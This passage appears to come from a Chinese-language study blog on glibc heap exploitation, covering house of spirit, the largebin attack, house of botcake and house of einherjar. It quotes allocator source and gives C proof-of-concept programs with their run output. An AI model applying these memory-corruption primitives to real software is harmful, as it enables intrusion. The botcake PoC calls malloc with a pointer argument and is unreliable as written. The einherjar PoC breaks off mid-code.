class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æ£€æŸ¥çš„æ¡ä»¶æ˜¯:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.nextchunk.prev_size &gt; chunk_hdr_sz (0x10)</span><br><span class="line">2.nextchunk.prev_size &lt; av-&gt;system_mem (æ•´ä¸ªå †åŒºçš„å¤§å°,å¯èƒ½æ˜¯0x21000)</span><br></pre></td></tr></table></figure>

<p>ä¸éœ€è¦å’Œ<code>fake_chunk.size</code>è®¾ç½®ç›¸åŒ,åªéœ€è¦æ»¡è¶³ä¸Šè¿°ä¸¤ä¸ªæ¡ä»¶å³å¯</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *victim;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> fake_chunk[<span class="number">10</span>];</span><br><span class="line">    <span class="type">size_t</span> *target;</span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//prev_size</span></span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0x40</span>;  <span class="comment">//size</span></span><br><span class="line">    fake_chunk[<span class="number">9</span>] = <span class="number">0x1145</span>;  <span class="comment">//ç»•è¿‡ä¸¤ä¸ªå®½æ¾çš„æ£€æŸ¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    victim = (<span class="type">size_t</span> *)&amp;fake_chunk[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">free</span>(victim);       <span class="comment">//å°†å †æ ˆä¸Šçš„å‡å †å—é‡Šæ”¾è¿›å…¥fastbin</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;   </span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">//æ¸…ç©ºtcacheä¿è¯ä¸‹ä¸€æ¬¡ä»fastbinä¸­æ‹¿</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x30</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim: %p\n&quot;</span>, victim); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target: %p\n&quot;</span>, target);</span><br><span class="line">    assert(target == victim);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_spirit.c -o house_of_spirit -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_spirit</span><br><span class="line">victim: 0x7ffe53fab090</span><br><span class="line">target: 0x7ffe53fab090</span><br></pre></td></tr></table></figure>



<h3 id="largebins"><a href="#largebins" class="headerlink" title="largebins"></a>largebins</h3><h4 id="ä»»æ„åˆæ³•åœ°å€å†™å †å—åœ°å€"><a href="#ä»»æ„åˆæ³•åœ°å€å†™å †å—åœ°å€" class="headerlink" title="ä»»æ„åˆæ³•åœ°å€å†™å †å—åœ°å€"></a>ä»»æ„åˆæ³•åœ°å€å†™å †å—åœ°å€</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241101205326333.png" alt="image-20241101205326333"></p>
<p>1.é¦–å…ˆå°†<code>0x431</code> é‡Šæ”¾è¿›å…¥<code>largebin</code></p>
<p>2.å‡è®¾æ­¤æ—¶æˆ‘ä»¬æœ‰ä¸€ä¸ª<code>UAF</code> ,ä¿®æ”¹<code>0x431</code>ä»å †å—çš„<code>bk_nextsize</code>æŒ‡é’ˆæŒ‡å‘ç›®æ ‡åœ°å€</p>
<p>3.å°†é‡Šæ”¾<code>0x421</code>é‡Šæ”¾è¿›å…¥<code>largebin</code>,æ­¤æ—¶ç”±äº<code>0x421</code>æ˜¯è¯¥<code>bin</code>ä¸­æœ€å°çš„,å› æ­¤<code>0x421</code>æ”¾å…¥<code>largebin</code>ä¸­ä¸ä¼šæœ‰ä»»ä½•æ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">     victim_index = largebin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">                 fwd = bck;</span><br><span class="line">                 bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                 victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">               &#125;</span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>å…¶æ•ˆæœå°±æ˜¯<code>target-&gt;fd_nextsize = &amp;chunk_0x421</code></p>
<p><code>0x431</code>çš„<code>fd_nextsize</code>è¿˜æ˜¯é”™è¯¯åœ°æŒ‡å‘è‡ªå·±,è¿™æ˜¯å› ä¸ºä¿®æ”¹è¯¥æŒ‡é’ˆçš„<strong>æœºä¼š</strong>è¢«ç”¨äºä¿®æ”¹<code>target</code>çš„<code>fd_nextsize</code>äº†</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">//use struct to align automatically</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> fd;</span><br><span class="line">    <span class="type">size_t</span> bk;</span><br><span class="line">    <span class="type">size_t</span> fd_nextsize;</span><br><span class="line">    <span class="type">size_t</span> bk_nextsize;</span><br><span class="line">&#125;Target;</span><br><span class="line"></span><br><span class="line">Target target=&#123;</span><br><span class="line">    .prev_size = <span class="number">0</span>,</span><br><span class="line">    .size = <span class="number">0</span>,</span><br><span class="line">    .fd = <span class="number">0</span>,</span><br><span class="line">    .bk = <span class="number">0</span>,</span><br><span class="line">    .fd_nextsize = <span class="number">0</span>,</span><br><span class="line">    .bk_nextsize = <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_target</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size: %p\n&quot;</span>, target.prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %p\n&quot;</span>, target.size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd: %p\n&quot;</span>, target.fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bk: %p\n&quot;</span>, target.bk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd_nextsize: %p\n&quot;</span>, target.fd_nextsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bk_nextsize: %p\n&quot;</span>, target.bk_nextsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *A;</span><br><span class="line">    <span class="type">size_t</span> *B;</span><br><span class="line">    <span class="type">size_t</span> *gap1;</span><br><span class="line">    <span class="type">size_t</span> *gap2;</span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    gap1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    gap2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(A);        <span class="comment">//A first put into unsortedbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x430</span>);  <span class="comment">//a larger malloc request cause A then put into largebin</span></span><br><span class="line">    <span class="built_in">free</span>(B);        <span class="comment">//B first put into unsortedbin</span></span><br><span class="line"></span><br><span class="line">    A[<span class="number">3</span>] = &amp;target;</span><br><span class="line">    print_target();</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x430</span>);  <span class="comment">//put B into the same largebin as A</span></span><br><span class="line">    print_target();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc largebin_attack.c -o largebin_attack -w -g</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./largebin_attack</span><br><span class="line">----------------------------------------------</span><br><span class="line">prev_size: (nil)</span><br><span class="line">size: (nil)</span><br><span class="line">fd: (nil)</span><br><span class="line">bk: (nil)</span><br><span class="line">fd_nextsize: (nil)</span><br><span class="line">bk_nextsize: (nil)</span><br><span class="line">----------------------------------------------</span><br><span class="line">----------------------------------------------</span><br><span class="line">prev_size: (nil)</span><br><span class="line">size: (nil)</span><br><span class="line">fd: (nil)</span><br><span class="line">bk: (nil)</span><br><span class="line">fd_nextsize: 0x55ea6d16f6e0</span><br><span class="line">bk_nextsize: (nil)</span><br><span class="line">----------------------------------------------</span><br></pre></td></tr></table></figure>

<p>åŒç†å¯ä»¥å°†å †å—åœ°å€å†™åˆ°å †æ ˆä¸Š</p>
<h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><h4 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h4><p>å½“é‡Šæ”¾çš„å †å—æ²¡æœ‰è¢«<code>tcache</code>æ¥å—(é€šå¸¸å› ä¸º<code>tcache</code>æ»¡äº†),ä¹Ÿæ²¡æœ‰è¢«<code>fastbin</code>æ¥å—(é€šå¸¸æ¯”<code>fastbin</code>ç®¡è¾–èŒƒå›´å¤§),</p>
<p>æ­¤æ—¶å°è¯•å¯¹å †å—å°è¯•<strong>å‘å‰åˆå¹¶å‘ååˆå¹¶</strong></p>
<p>å¦‚æœå‘åä¸´è¿‘<code>topchunk</code>åˆ™ç›´æ¥è¿˜ç»™<code>topchunk</code></p>
<p>å¦‚æœå‘åä¸ä¸´è¿‘<code>topchunk</code>,åˆ™ä¼šæ”¾åˆ°<code>unsortedbin</code>ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">&#123;</span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))</span><br><span class="line">    &#123;</span><br><span class="line">        prevsize = prev_size(p);</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        unlink_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* consolidate forward */</span></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink_chunk(av, nextchunk);</span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        bck = unsorted_chunks(av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>å‡è®¾æœ‰ä¸¤ä¸ªå †å—<code>a</code>å’Œ<code>b</code>åœ¨ç‰©ç†ä¸Šç›¸é‚»,<code>a</code>åœ¨ä½å¤„,<code>b</code>åœ¨é«˜å¤„</p>
<p>å…ˆé‡Šæ”¾<code>b</code>è¿›å…¥<code>unsortedbin</code>,ç„¶åé‡Šæ”¾<code>a</code>,</p>
<p>æ­¤æ—¶<code>a</code>ä¼šå‘å‰åˆå¹¶åˆ°<code>b</code></p>
<p>æ­¤æ—¶è®©<code>tcachebin</code>è…¾ä¸ªç©º,<code>Double Free a</code>,è®©<code>a</code>è¿›å…¥<code>tcachebins</code></p>
<blockquote>
<p>ä¸ºä»€ä¹ˆè¦è®©<code>tcachebin</code>è…¾ç©ºå‘¢?ç›´æ¥<code>free</code>æ”¾åˆ°<code>bins</code>ä¸­ä¸è¡Œå—?</p>
<p>è¿˜çœŸä¸è¡Œ,å› ä¸ºç¬¬ä¸€æ¬¡<code>free(a)</code>è¿›å…¥<code>unsortedbin</code>æ—¶,ä¼šè®©<code>a-&gt;nextchunk-&gt;prev_in_use</code>ç½®é›¶,</p>
<p>ä¸‹ä¸€æ¬¡å¦‚æœ<code>free(a)</code>è¿˜æ˜¯è¿›å…¥<code>unsortedbin</code>ä¸­æ—¶,ä¼šæ£€æŸ¥åˆ°<code>a-&gt;nextchunk-&gt;prev_in_use=0</code>,æ£€æŸ¥å‡ºäº†äºŒæ¬¡é‡Šæ”¾</p>
<p>è€Œ<code>tcachebins</code>åªä¼šæœ‰ä¸€ä¸ª<code>key</code>å€¼åˆ¤é‡æ£€æŸ¥,æ˜¾ç„¶é‡Šæ”¾è¿›å…¥<code>bins</code>ä¸­çš„å †å—ä¸ä¼šè®¾ç½®<code>key</code>å€¼,èƒ½å¤Ÿé€šè¿‡è¿™ä¸ªæ£€æŸ¥</p>
</blockquote>
<p>é‚£ä¹ˆæ­¤æ—¶å°±å½¢æˆäº†å †å—é‡å </p>
<p><code>a</code>æˆä¸º<code>b</code>è…¹ä¸­çš„ä¸€éƒ¨åˆ†</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *a;</span><br><span class="line">    <span class="type">size_t</span> *b;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">//b&#x27;s address is higher than a&#x27;s</span></span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//prevent consolidation with topchunk</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(b);<span class="comment">//free b into unsortedbins</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">//a will consolidate with b </span></span><br><span class="line">    tcache_chunks[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//make room for </span></span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">malloc</span>(b);</span><br><span class="line">    b[<span class="number">0</span>]=<span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,a[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_botcake.c -o house_of_botcake -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_botcake</span><br><span class="line">0x1122334455667788</span><br></pre></td></tr></table></figure>



<h4 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h4><p>æ”»å‡»å‡è®¾:</p>
<p>0.èƒ½å¤Ÿæ§åˆ¶<code>tcache</code>çš„çŠ¶æ€</p>
<p>1.å †å—ç”³è¯·æ—¶,å¤ç”¨ä¸‹ä¸€å †å—çš„<code>prev_size</code>å­—æ®µ,èƒ½å¤Ÿæ„é€ å‡çš„<code>prev_size</code>å­—æ®µ</p>
<p>å¹¶ä¸”å­˜åœ¨<code>off-by-one</code>,èƒ½å¤Ÿå†ä¿®æ”¹<code>size</code>çš„æ ‡å¿—ä½ä¸­çš„<code>prev_in_use</code></p>
<p>ç”»ä¸ªå›¾æ„æ€æ„æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241104213606983.png" alt="image-20241104213606983"></p>
<p><code>b</code>æœ€ç»ˆè¢«é‡Šæ”¾è¿›å…¥<code>tcache</code>ä¹‹å,å¯ä»¥ä½¿ç”¨<code>fake_chunk</code>æ”¹å†™<code>tcache</code>çš„å…ƒæ•°æ®è¿›è¡ŒæŠ•æ¯’</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *a;</span><br><span class="line">    <span class="type">size_t</span> *b;</span><br><span class="line">    <span class="type">size_t</span> *c;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line">    <span class="type">size_t</span> *target;</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk_header;</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk_mem;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    